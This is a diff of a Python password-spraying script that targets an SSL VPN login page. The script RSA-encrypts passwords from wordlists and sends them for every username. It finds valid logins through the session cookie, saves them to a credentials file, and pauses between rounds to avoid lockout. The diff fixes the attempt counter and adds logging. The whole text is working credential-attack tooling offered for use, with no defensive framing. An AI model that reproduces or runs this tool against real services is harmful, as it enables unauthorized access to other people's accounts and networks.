@@ -19,8 +19,8 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 #User Args: Username wordlist, password wordlist and Cookies needs to be modified
 Headers={"Content-Type": "application/x-www-form-urlencoded"}
-Cookies={"CheckCookieSupport":"1","_ga":"xxxx","_fbp":"xxxx","_gcl_au":"xxxx","selected_realm":"ssl_vpn","_gid":"xxxx"}
-usernameList="./usernames.txt"
+Cookies={"CheckCookieSupport":"1","_ga":"XXXXXXX","_fbp":"XXXXXXX","_gcl_au":"XXXXXXX","selected_realm":"ssl_vpn","_gid":"XXXXXXX"}
+usernameList="./user.txt"
 passwordList="./pass.txt"
 
 #User arguments function
@@ -53,7 +53,7 @@ def iterbytes (x) :
 def pubkey(password) :
     # Exponent (e) and Modulus (m) are stored within the JavaScript file JS_RSA.JS (var modulus / var exponent)
     e = int(b'XXXXX', 16)
-    m = int('XXXXXXXXXXXXXXXXXXXXXXXXXXXX',16)
+    m = int('XXXXXXXXXXXXXXXXXXX',16)
     pubkey  = RSA.construct((m, e))
     passpass = encrypt(password,pubkey)
     return passpass
@@ -83,11 +83,11 @@ def encrypt(password,pubkey) :
 
 
 def spray(url, usernameList, passwordList, attempt, loop):
-    counter = 1
+    counter = 0
     passwords = open(passwordList, "r")
     for password in passwords:
         passwd = (password.strip("\n"))
-        print("\n########### Starting with password : "+passwd+" ###########\n")
+        print("\n########### Starting with password : "+passwd+" ########### Counter = "+ str(counter) +"\n")
                 
         users = open(usernameList, "r")    
         encryptedpass = pubkey(passwd)
@@ -98,21 +98,22 @@ def spray(url, usernameList, passwordList, attempt, loop):
             req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False)
             
             print("--- Username : "+username+" : "+passwd)
+            print("each user: "+str(counter))
 
             if req.cookies.get('AuthSessionID'):
                 print("+++++++++ Found VALID credentials: "+ username + " : " + passwd + " +++++++++")
                 result = open("./credentials.txt", "a")
                 result.write(username+":"+passwd+"\n")
                 result.close()
-
             else:
-                continue
+                pass
 
-        if counter == attempt:
+        counter = counter + 1
+        if counter >= attempt:
             print("\n.......... Sleeping for "+ str(loop) + "min after password : " + passwd + "..........")        
             time.sleep(loop*60)
         else:
-            continue
+            pass
 
 if __name__ == "__main__":
     args = get_Args()
